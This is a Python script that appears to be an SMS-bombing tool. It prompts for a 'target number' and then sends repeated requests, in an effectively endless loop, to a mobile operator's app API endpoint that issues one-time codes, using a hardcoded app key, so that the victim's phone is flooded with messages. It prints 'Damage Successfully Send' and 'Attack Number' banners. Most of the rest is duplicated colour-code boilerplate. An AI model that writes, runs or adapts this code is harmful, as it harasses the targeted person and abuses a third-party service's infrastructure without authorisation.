

# -*- coding: UTF-8 -*-
import os
os.system('clear')

import os
os.system("lolcat ban.py")

print("\n")
import asyncio, os, sys
import requests
import time
# Bold High Intensty
biblack="\033[1;90m"      # Black
bired="\033[1;91m"        # Red
bigreen="\033[1;92m"      # Green
biyellow="\033[1;93m"     # Yellow
biblue="\033[1;94m"       # Blue
bipurple="\033[1;95m"     # Purple
bicyan="\033[1;96m"       # Cyan
biehite="\033[1;97m"      # White
# You Can Change The Key's Name. But don't Change The Values.
color_off="\033[0m"       # Text Reset
Default      = "\033[102m"
Black        = "\033[105m"
Red          = "\033[100m"
Green        = "\033[210m"
Yellow       = "\033[220m"
Blue         = "\033[109m"
Magenta      = "\033[160m"
Cyan         = "\033[170m"
LightGray    = "\033[180m"
DarkGray     = "\033[90m"
LightRed     = "\033[91m"
LightGreen   = "\033[92m"
LightYellow  = "\033[93m"
LightBlue    = "\033[94m"
LightMagenta = "\033[295m"
Magenta      = "\033[35m"
Cyan         = "\033[36m"
LightGray    = "\033[37m"
DarkGray     = "\033[90m"
LightRed     = "\033[91m"
LightGreen   = "\033[92m"
LightYellow  = "\033[93m"
LightBlue    = "\033[94m"
LightMagenta = "\033[95m"
LightCyan    = "\033[96m"
White        = "\033[97m"

HEADER = "\033[95m"
OKBLUE = "\033[94m"
OKGREEN = "\033[92m"
WARNING = "\033[93m"
FAIL = "\033[91m"
ENDC = "\033[0m"
BOLD = "\033[1m"
pink = "\033[95m"
teal = "\033[96m"
grey = "\033[97m"
CEND      = "\33[0m"
CBOLD     = "\33[1m"
CITALIC   = "\33[3m"
CURL      = "\33[4m"
CBLINK    = "\33[5m"
CBLINK2   = "\33[6m"
CSELECTED = "\33[7m"


CRED    = "\33[31m"
CGREEN  = "\33[32m"
CYELLOW = "\33[33m"
CBLUE   = "\33[34m"
CVIOLET = "\33[35m"
CBEIGE  = "\33[36m"
CWHITE  = "\33[37m"

CBLACKBG  = "\33[40m"
CREDBG    = "\33[41m"
CGREENBG  = "\33[42m"
CYELLOWBG = "\33[43m"
CBLUEBG   = "\33[44m"
CVIOLETBG = "\33[45m"
CBEIGEBG  = "\33[46m"
CWHITEBG  = "\33[47m"

CGREY    = "\33[90m"
CRED2    = "\33[91m"
CGREEN2  = "\33[92m"
CYELLOW2 = "\33[93m"
CBLUE2   = "\33[94m"
CVIOLET2 = "\33[95m"
CBEIGE2  = "\33[96m"
CWHITE2  = "\33[97m"

CGREYBG    = "\33[100m"
CREDBG2    = "\33[101m"
CGREENBG2  = "\33[102m"
CYELLOWBG2 = "\33[103m"
CBLUEBG2   = "\33[104m"
CVIOLETBG2 = "\33[105m"
CBEIGEBG2  = "\33[106m"
CWHITEBG2  = "\33[107m"
# Bold High Intensty
biblack="\033[1;90m"      # Black
bired="\033[1;91m"        # Red
bigreen="\033[1;92m"      # Green
biyellow="\033[1;93m"     # Yellow
biblue="\033[1;94m"       # Blue
bipurple="\033[1;95m"     # Purple
bicyan="\033[1;96m"       # Cyan
biehite="\033[1;97m"      # White
# You Can Change The Key's Name. But don't Change The Values.

# Reset
color_off="\033[0m"       # Text Reset
colors=["\033[1;90m","\033[1;91m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[1;97m","\033[190m","\033[196m","\033[295m","\033[295m","\033[35m","\033[36m","\033[37m","\033[90m","\033[91m","\033[92m","\033[93m","\033[94m","\033[95m","\033[96m","\033[97m","\33[31m","\33[32m","\33[33m","\33[34m","\33[35m","\33[36m","\33[37m"]
# Reset
color_off="\033[0m"       # Text Reset

# Regular Colors
black="\033[0;30m"        # Black
red="\033[0;31m"          # Red
green="\033[0;32m"        # Green
yellow="\033[0;33m"       # Yellow
blue="\033[0;34m"         # Blue
purple="\033[0;35m"       # Purple
cyan="\033[0;36m"         # Cyan
white="\033[0;37m"        # White

# Bold
bblack="\033[1;30m"       # Black
bred="\033[1;31m"         # Red
bgreen="\033[1;32m"       # Green
byellow="\033[1;33m"      # Yellow
bblue="\033[1;34m"        # Blue
bpurple="\033[1;35m"      # Purple
bcyan="\033[1;36m"        # Cyan
bwhite="\033[1;37m"       # White

# Underline
ublack="\033[4;30m"       # Black
ured="\033[4;31m"         # Red
ugreen="\033[4;32m"       # Green
uyellow="\033[4;33m"      # Yellow
ublue="\033[4;34m"        # Blue
upurple="\033[4;35m"      # Purple
ucyan="\033[4;36m"        # Cyan
uwhite="\033[4;37m"       # White

# Background
on_black="\033[40m"       # Black
on_red="\033[41m"         # Red
on_green="\033[42m"       # Green
on_yellow="\033[43m"      # Yellow
on_blue="\033[44m"        # Blue
on_purple="\033[45m"      # Purple
on_cyan="\033[46m"        # Cyan
on_white="\033[47m"       # White

# High Intensty
iblack="\033[0;90m"       # Black
ired="\033[0;91m"         # Red
igreen="\033[0;92m"       # Green
iyellow="\033[0;93m"      # Yellow
iblue="\033[0;94m"        # Blue
ipurple="\033[0;95m"      # Purple
icyan="\033[0;96m"        # Cyan
iwhite="\033[0;97m"       # White

# Bold High Intensty
biblack="\033[1;90m"      # Black
bired="\033[1;91m"        # Red
bigreen="\033[1;92m"      # Green
biyellow="\033[1;93m"     # Yellow
biblue="\033[1;94m"       # Blue
bipurple="\033[1;95m"     # Purple
bicyan="\033[1;96m"       # Cyan
biehite="\033[1;97m"      # White

# High Intensty backgrounds
on_iblack="\033[0;100m"   # Black
on_ired="\033[0;101m"     # Red
on_igreen="\033[0;102m"   # Green
on_iyellow="\033[0;103m"  # Yellow
on_iblue="\033[0;104m"    # Blue
on_ipurple="\033[10;95m"  # Purple
on_icyan="\033[0;106m"    # Cyan
on_iwhite="\033[0;107m"   # White
# Bold High Intensty
biblack="\033[1;90m"      # Black
bired="\033[1;91m"        # Red
bigreen="\033[1;92m"      # Green
biyellow="\033[1;93m"     # Yellow
biblue="\033[1;94m"       # Blue
bipurple="\033[1;95m"     # Purple
bicyan="\033[1;96m"       # Cyan

def logoprint(JonY):
    for word in JonY + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.001)
















import random

import time
import requests
from requests.structures import CaseInsensitiveDict

number=str(input(bigreen+"\n[>]	Enter Your Target Number: "+biyellow))



url = "https://circle.robi.com.bd/mylife/appapi/appcall.php"

headers = CaseInsensitiveDict()
headers["x-app-key"] = "000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg"
headers["User-Agent"] = "gzip"
headers["Content-Type"] = "application/x-www-form-urlencoded"

data = "op=getOTC&pin=21799&app_version=78&msisdn=88"+number





if number=="01875":
    print('This Number Protact 01875')


else:
	for i in range(99999999999999999999999999999999999999999999999999999999999999999999999):
		try:
			x = requests.post(url, headers=headers, data=data)
		
			
			print(random.choice(colors)+"\t\t\t "+str([ i+1]))
			print(random.choice(colors)+" [ 💗 ] 𝘿𝙖𝙈𝙖𝙂𝙚   𝙎𝙪𝘾𝙘𝙀𝙨𝙨𝙁𝙪𝙇𝙇𝙮    𝙎𝙚𝙣𝘿   [ ✔︎ ] ")
			print(random.choice(colors)+" \t     [ 💟 ]  𝘼𝙩𝙩𝙖𝘾𝙠 𝙉𝙪𝙈𝙗𝙚𝙍  [ 💟 ]  ")
			print(random.choice(colors)+" \t\t     "+number)
			print(random.choice(colors)+x.text)
			
		
			print("\n\n\n\n\n")

		except:
			print(" make sure internet connection")